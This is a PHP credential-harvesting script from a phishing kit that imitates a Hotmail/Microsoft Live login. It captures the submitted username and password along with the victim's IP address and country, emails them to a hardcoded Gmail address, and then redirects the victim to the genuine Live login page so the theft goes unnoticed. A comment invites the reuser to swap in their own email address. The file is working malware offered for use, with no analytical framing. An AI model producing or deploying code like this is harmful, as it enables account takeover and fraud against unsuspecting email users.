<?

$ip = getenv("REMOTE_ADDR");

$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.

$ip));

$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));

$hostname = gethostbyaddr($ip);

$message .= "=======================\n";
$message .= "Username : ".$_POST['username']."\n";
$message .= "Password  : ".$_POST['password']."\n";
$message .= "IP               : ".$ip."\n";
$message .= "country     : ".$country."\n";
$message .= "=======================\n";


//change ur email here
$send = "janetwalex1@gmail.com";

$subject = "NETHERLANDS HOTMAIL";
$headers = "From: OBA";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=12&ct=1419069535&rver=6.4.6456.0&wp=MBI_SSL_SHARED&wreply=https:%2F%2Fdub113.mail.live.com%2Fdefault.aspx%3Fmkt%3Dde-ch%26rru%3Dinbox&lc=2055&id=64855&mkt=de-ch&cbcxt=mai");

	 
?>